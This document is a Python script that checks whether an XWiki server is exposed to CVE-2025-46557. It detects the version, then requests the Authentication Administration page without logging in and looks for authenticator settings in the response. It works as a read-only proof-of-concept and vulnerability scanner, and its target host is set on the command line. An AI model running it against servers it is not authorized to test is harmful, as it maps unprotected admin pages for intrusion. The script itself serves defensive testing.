#!/usr/bin/env python3
import requests
import sys
import re

TARGET_HOST = "http://127.0.0.1:8080"

def get_xwiki_version(session):
    try:
        resp = session.get(f"{TARGET_HOST}/xwiki/bin/view/Main/", timeout=30, allow_redirects=True)
        match = re.search(r'XWiki (\d+\.\d+\.?\d*)', resp.text)
        if match:
            return match.group(1)
    except:
        pass
    return None

def check_vulnerability():
    vuln_url = f"{TARGET_HOST}/xwiki/bin/view/XWiki/Authentication/Administration"
    
    print(f"[*] Testing CVE-2025-46557 on {TARGET_HOST}")
    
    try:
        session = requests.Session()
        
        version = get_xwiki_version(session)
        if version:
            print(f"[*] XWiki version detected: {version}")
            
            try:
                parts = version.split('.')
                major = int(parts[0])
                minor = int(parts[1]) if len(parts) > 1 else 0
                patch = int(parts[2]) if len(parts) > 2 else 0
                
                vulnerable = False
                if major == 15 and minor >= 3 and (minor < 10 or (minor == 10 and patch < 14)):
                    vulnerable = True
                elif major == 16 and minor < 4:
                    vulnerable = True
                elif major == 16 and minor == 4 and patch < 6:
                    vulnerable = True
                elif major == 16 and minor >= 5 and minor < 10:
                    vulnerable = True
                    
                if vulnerable:
                    print(f"[+] Version {version} is in the vulnerable range!")
                else:
                    print(f"[*] Version {version} may be patched.")
            except:
                pass
        
        vuln_urls = [
            f"{TARGET_HOST}/bin/view/XWiki/Authentication/Administration",
            f"{TARGET_HOST}/xwiki/bin/view/XWiki/Authentication/Administration"
        ]
        
        for vuln_url in vuln_urls:
            print(f"[*] Trying: {vuln_url}")
            resp = session.get(vuln_url, timeout=30, allow_redirects=True)
            if resp.status_code == 200 and "data-xwiki-isnew=\"false\"" in resp.text:
                break
        
        print(f"[*] Using: {vuln_url}")
        
        if resp.status_code == 200:
            content = resp.text
            
            indicators = [
                "authenticatorHint",
                "xwiki.authentication.authclass",
                "Standard XWiki Authenticator",
                "authenticator-admin",
                "AuthenticationConfigurationClass"
            ]
            
            found_indicators = [ind for ind in indicators if ind.lower() in content.lower()]
            
            if found_indicators:
                print("[+] VULNERABLE: Authentication Administration page is accessible without authorization!")
                print(f"[+] Found indicators: {', '.join(found_indicators)}")
                print("[+] An unauthenticated user can view and potentially change authenticator settings.")
                return True
            elif "The requested page could not be found" in content:
                print("[-] Page not found. XWiki Standard Flavor may not be installed.")
                print("[-] Install XWiki Standard Flavor via Distribution Wizard to test this vulnerability.")
                return False
            else:
                print("[*] Page accessible but configuration indicators not found.")
                print("[*] The Authentication Administration page may exist but have limited content.")
                return True
        elif resp.status_code == 401 or resp.status_code == 403:
            print("[-] NOT VULNERABLE: Access denied (authentication/authorization required).")
            return False
        elif resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'login' in location.lower():
                print("[-] NOT VULNERABLE: Redirected to login page.")
                return False
            else:
                print(f"[-] Redirected to: {location}")
                return False
        else:
            print(f"[-] Unexpected response: HTTP {resp.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed. Is XWiki running at {TARGET_HOST}?")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    global TARGET_HOST
    if len(sys.argv) > 1:
        TARGET_HOST = sys.argv[1].rstrip('/')
    
    result = check_vulnerability()
    sys.exit(0 if result else 1)

if __name__ == "__main__":
    main()
